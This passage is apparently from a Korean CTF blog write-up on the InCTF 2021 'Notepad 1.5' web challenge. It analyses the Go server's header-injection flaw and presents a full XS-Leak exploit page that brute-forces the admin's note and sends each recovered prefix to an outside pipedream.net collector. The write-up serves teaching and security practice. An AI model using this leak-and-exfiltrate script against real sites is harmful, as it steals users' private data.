class="string">&quot;POST&quot;</span>)</span><br><span class="line">	s.HandleFunc(<span class="string">&quot;/get&quot;</span>, get).Methods(<span class="string">&quot;GET&quot;</span>)</span><br><span class="line">	s.HandleFunc(<span class="string">&quot;/find&quot;</span>, find).Methods(<span class="string">&quot;GET&quot;</span>)</span><br><span class="line">	s.PathPrefix(<span class="string">&quot;/&quot;</span>).Handler(http.StripPrefix(<span class="string">&quot;/&quot;</span>, http.FileServer(http.Dir(dir))))</span><br><span class="line">	fmt.Println(<span class="string">&quot;Server started at http://0.0.0.0:3000&quot;</span>)</span><br><span class="line">	loggedRouter := handlers.LoggingHandler(os.Stdout, r)</span><br><span class="line">	srv := &amp;http.Server&#123;</span><br><span class="line">		Addr: <span class="string">&quot;0.0.0.0:3000&quot;</span>,</span><br><span class="line">		<span class="comment">// Good practice to set timeouts to avoid Slowloris attacks.</span></span><br><span class="line">		WriteTimeout: time.Second * <span class="number">15</span>,</span><br><span class="line">		ReadTimeout:  time.Second * <span class="number">15</span>,</span><br><span class="line">		IdleTimeout:  time.Second * <span class="number">60</span>,</span><br><span class="line">		Handler:      loggedRouter, <span class="comment">// Pass our instance of gorilla/mux in.</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> err := srv.ListenAndServe(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Println(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>main()</code> 함수는 go 파일이 실행될 때, 실행이 되는 곳 입니다. C언어에 main() 함수와 동일 합니다. 일단 코드를 보면 <code>/add</code>, <code>/get</code>, <code>/find</code>, <code>/</code> 경로로 라우팅을 시켜주는 것을 볼 수 있습니다.</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	id := getIDFromCooke(r, w)</span><br><span class="line">	<span class="keyword">if</span> id != adminID &#123;</span><br><span class="line">		r.ParseForm()</span><br><span class="line">		noteConte := r.Form.Get(<span class="string">&quot;content&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(noteConte) &lt; <span class="number">75</span> &#123;</span><br><span class="line">			Notes[id] = noteConte</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Fprintf(w, <span class="string">&quot;OK&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>/add</code> 기능은 메모 작성을 저장하는 기능인데 코드를 보면 <code>getIDFromCooke()</code> 함수를 이용해서 쿠키에서 <code>id</code>를 가져 온 후에 <code>id</code>가 관리자 아이디와 동일하지 않으면 입력한 값을 <code>Notes[id]</code>에 넣어주는 것을 볼 수 있습니다. 여기서 <code>getIDFromCooke()</code> 함수는 그냥 현재 요청 한 사용자의 쿠키에서 <code>id</code> 값을 가져와서 <code>id</code>가 없으면 생성하고, 있으면 그냥 그 값을 반환해주는 함수입니다. </p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">get</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	id := getIDFromCooke(r, w)</span><br><span class="line">	x := Notes[id]</span><br><span class="line">	headerSetter(w, cType)</span><br><span class="line">	<span class="keyword">if</span> x == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		fmt.Fprintf(w, <span class="string">&quot;404 No Note Found&quot;</span>)</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> regexp.MustCompile(<span class="string">&quot;&lt;[a-zA-Z0-9]&quot;</span>).MatchString(x) &#123;</span><br><span class="line">		fmt.Fprintf(w, html.EscapeString(x))</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Fprintf(w, x)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>/get</code> 기능은 <code>/add</code> 기능으로 작성한 메모를 보여주는 기능 입니다. <code>getIDFromCooke()</code> 함수로 <code>id</code>를 가져와서 <code>id</code> 값을 가진 메모를 가져온 후에 <code>Fprintf()</code> 함수로 출력하는 것을 볼 수 있습니다.</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">find</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	id := getIDFromCooke(r, w)</span><br><span class="line"></span><br><span class="line">	param := r.URL.Query()</span><br><span class="line">	x := Notes[id]</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> which <span class="type">string</span></span><br><span class="line">	str, err := param[<span class="string">&quot;condition&quot;</span>]</span><br><span class="line">	<span class="keyword">if</span> !err &#123;</span><br><span class="line">		which = <span class="string">&quot;any&quot;</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		which = str[<span class="number">0</span>]</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> start <span class="type">bool</span></span><br><span class="line">	str, err = param[<span class="string">&quot;startsWith&quot;</span>]</span><br><span class="line">	<span class="keyword">if</span> !err &#123;</span><br><span class="line">		start = strings.HasPrefix(x, <span class="string">&quot;arthur&quot;</span>)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		start = strings.HasPrefix(x, str[<span class="number">0</span>])</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> responseee <span class="type">string</span></span><br><span class="line">	<span class="keyword">var</span> end <span class="type">bool</span></span><br><span class="line">	str, err = param[<span class="string">&quot;endsWith&quot;</span>]</span><br><span class="line">	<span class="keyword">if</span> !err &#123;</span><br><span class="line">		end = strings.HasSuffix(x, <span class="string">&quot;morgan&quot;</span>)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		end = strings.HasSuffix(x, str[<span class="number">0</span>])</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> which == <span class="string">&quot;starts&quot;</span> &amp;&amp; start &#123;</span><br><span class="line">		responseee = x</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> which == <span class="string">&quot;ends&quot;</span> &amp;&amp; end &#123;</span><br><span class="line">		responseee = x</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> which == <span class="string">&quot;both&quot;</span> &amp;&amp; (start &amp;&amp; end) &#123;</span><br><span class="line">		responseee = x</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> which == <span class="string">&quot;any&quot;</span> &amp;&amp; (start || end) &#123;</span><br><span class="line">		responseee = x</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		_, present := param[<span class="string">&quot;debug&quot;</span>]</span><br><span class="line">		<span class="keyword">if</span> present &#123;</span><br><span class="line">			<span class="built_in">delete</span>(param, <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">			<span class="built_in">delete</span>(param, <span class="string">&quot;startsWith&quot;</span>)</span><br><span class="line">			<span class="built_in">delete</span>(param, <span class="string">&quot;endsWith&quot;</span>)</span><br><span class="line">			<span class="built_in">delete</span>(param, <span class="string">&quot;condition&quot;</span>)</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> v, d := <span class="keyword">range</span> param &#123;</span><br><span class="line">				<span class="keyword">for</span> _, k := <span class="keyword">range</span> d &#123;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span> regexp.MustCompile(<span class="string">&quot;^[a-zA-Z0-9&#123;&#125;_;-]*$&quot;</span>).MatchString(k) &amp;&amp; <span class="built_in">len</span>(d) &lt; <span class="number">5</span> &#123;</span><br><span class="line">						w.Header().Set(v, k)</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		responseee = <span class="string">&quot;404 No Note Found&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	headerSetter(w, cType)</span><br><span class="line">	fmt.Fprintf(w, responseee)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>/find</code> 기능은 사용자가 저장한 메모가 존재하는 지 없는 지 찾은 후에, 존재&#x2F;미존재를 분기로 처리하는 로직입니다.</p>
+<ul>
+<li>Information</li>
+</ul>
+<ol>
+<li>condition 값을 가져와서 str 변수에 저장합니다.</li>
+<li>만약 에러가 났다면 which 변수에 <code>&quot;any&quot;</code>라는 문자열을 넣어주고, 에러가 나지 않았다면 우리가 입력한 condition의 값을 which에 넣어줍니다.</li>
+<li>startsWith 값을 가져와서 str 변수에 저장합니다.</li>
+<li>에러가 나지 않았다면 <code>strings.HasPrefix()</code> 메서드를 이용해서 <code>startsWith</code> 값을 x의 값과 비교하는 것을 볼 수 있습니다. ( 이때 x의 값은 현재 사용자가 저장한 노트 값이고, <code>strings.HasPrefix()</code> 메서드는 자바스크립트에서 includes()와 동일 합니다. )</li>
+<li>endsWith 값을 가져와서 str 변수에 저장합니다.</li>
+<li>에러가 나지 않았다면 <code>strings.HasSuffix()</code> 메서드를 이용해서 <code>endsWith</code> 값을 x의 값과 비교하는 것을 볼 수 있습니다. ( 이때 x의 값은 현재 사용자가 저장한 노트 값이고, <code>strings.HasSuffix()</code> 메서드는 자바스크립트에서 includes()와 동일 하지만 뒤에서부터 검사합니다. )</li>
+<li>start&#x2F;end 로직이 끝나면 여러 분기 별로 처리하는 것을 볼 수 있는데, 이때 모든 분기와 일치하지 않는 다면 debug 값을 가져와서 _와 present에 넣는 것을 볼 수 있습니다. 이때 present에는 true가 들어갑니다.</li>
+<li>presend의 값이 true 이면 <code>debug</code>, <code>startWith</code>, <code>endsWith</code>, <code>condition</code> 파라미터를 모두 지우고, 다른 파라미터가 있다면 해당 파라미터를 기반으로 <code>Header()</code> 메서드를 이용해서 응답 헤더를 설정하는 것을 볼 수 있습니다.</li>
+<li>모든 처리가 끝나면 <code>headerSetter()</code> 함수를 이용해서 응답 헤더를 설정하고, Fprintf() 함수를 이용해서 출력하는 것을 볼 수 있습니다.</li>
+</ol>
+<p>여기서 중요한 부분은 우리가 입력한 값과 노트의 값이 일치 하지 않으면 else 문 내부에 들어가는데, 여기서 응답 헤더 하나를 우리가 설정할 수 있다는 것 입니다. 우린 아까 위에서 <code>Download Trigger</code>에 대해서 배웠는데, 엔드포인트에서 <code>Content-Disposition: attachment</code> 헤더를 설정해서 반환하면 브라우저는 첨부 파일을 탐색하고 파일을 설치 한다는 것을 배웠습니다.</p>
+<p>그럼 우리가 입력한 값과 노트의 값이 일치 하지 않을 때는 <code>Content-Disposition: attachment</code> 헤더를 설정해 파일이 다운로드 되게 하고, 우리가 입력한 값과 노트의 값이 일치하면 파일은 다운로드 하지 않게 만들 수 있고, 이를 이용하면 XS-Leak 공격을 이용해 노트 값을 파악할 수 있습니다.</p>
+<p>그러므로 봇을 이용해 <code>/find</code>로 요청을 보내면 <code>id</code> 값은 관리자의 <code>id</code> 이므로 노트의 값으로 플래그가 들어올 것 이고, 이를 XS-Leak 공격을 이용해서 플래그를 획득할 수 있습니다.</p>
+<p><img src="https://user-images.githubusercontent.com/49112423/129488305-9cb0ce17-2495-4db8-8b46-bd82eb8ba3c3.png" alt="image"></p>
+<p>분석한 <code>/find</code> 로직을 확인하기 위해 위와 같이 메모를 작성했습니다. </p>
+<p><img src="https://user-images.githubusercontent.com/49112423/129488320-fbd08b0b-ff14-4b85-ae4c-007499638885.png" alt="image"><br><img src="https://user-images.githubusercontent.com/49112423/129488348-72e7814b-8385-40fa-b007-56cf503173c3.png" alt="image"></p>
+<p>확인을 해보니 입력값과 노트 값이 일치하면 노트 값이 출력이 되고, 일치 하지 않으면 파일이 다운로드 되는 것을 확인할 수 있었습니다. 이제 이를 이용해 플래그를 획득하면 될 거 같습니다.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Notepad 1.5 - Arthur&#x27;s Article Poc<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> string = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz1234567890~&#125;&#123;!@$%^*)(_+&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> flag = <span class="string">&#x27;inctf&#123;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">xs</span>(<span class="params">flag, str</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> url = <span class="string">`http://chall.notepad15.gq:1515/find?condition=starts&amp;debug&amp;Content-Disposition=attachment&amp;startsWith=<span class="subst">$&#123;flag + str&#125;</span>`</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> <span class="title class_">MyWindow</span> = <span class="variable language_">window</span>.<span class="title function_">open</span>(url);</span></span><br><span class="line"><span class="language-javascript">                <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">try</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="title class_">MyWindow</span>.<span class="property">origin</span>;</span></span><br><span class="line"><span class="language-javascript">                    &#125; <span class="keyword">catch</span> (err) &#123;</span></span><br><span class="line"><span class="language-javascript">                        flag += str;</span></span><br><span class="line"><span class="language-javascript">                        <span class="title function_">fetch</span>(<span class="string">&quot;https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/&quot;</span> + flag)</span></span><br><span class="line"><span class="language-javascript">                        <span class="title function_">broute_force</span>(flag);</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;, <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">broute_force</span>(<span class="params">flag</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">for</span> ( <span class="keyword">let</span> i = <span class="number">0</span>; i &lt; string.<span class="property">length</span>; i ++) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">xs</span>(flag, string[i])</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">broute_force</span>(flag);</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://user-images.githubusercontent.com/49112423/129514189-90b0699c-6f47-47b7-b49d-68fe1dd7a614.png" alt="image"></p>
+<p>위와 같이 익스플로잇 코드를 작성 후에 봇으로 넘겨주니 위와 같이 플래그를 뽑을 수 있었습니다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG : inctf&#123;red_dead_rezoday_ialmvwoawpwe&#125;</span><br></pre></td></tr></table></figure>
+
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2021/08/04/2021-08-04-UIU-CTF/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2021-08-16 23:29:53
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2021/09/12/2021-09-12-WhiteHat-Contest/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#What-is-Download-Trigger"><span class="toc-text">What is Download Trigger?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Web-InCTF-2021-Notepad-1-5-Arthur%E2%80%99s-Article-900-pts"><span class="toc-text">Exploit (Web) InCTF 2021 - Notepad 1.5 - Arthur’s Article [900 pts]</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/P0cas">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        Copyright © 2023 Pocas
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + InCTF%202021%20Notepad%201.5%20-%20Arthur's%20Article%20Write%20Up + '&url=' + https%3A%2F%2Fblog.pocas.kr%2F2021%2F08%2F16%2F2021-08-16-In-CTF%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://blog.pocas.kr/2021/08/16/2021-08-16-In-CTF/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
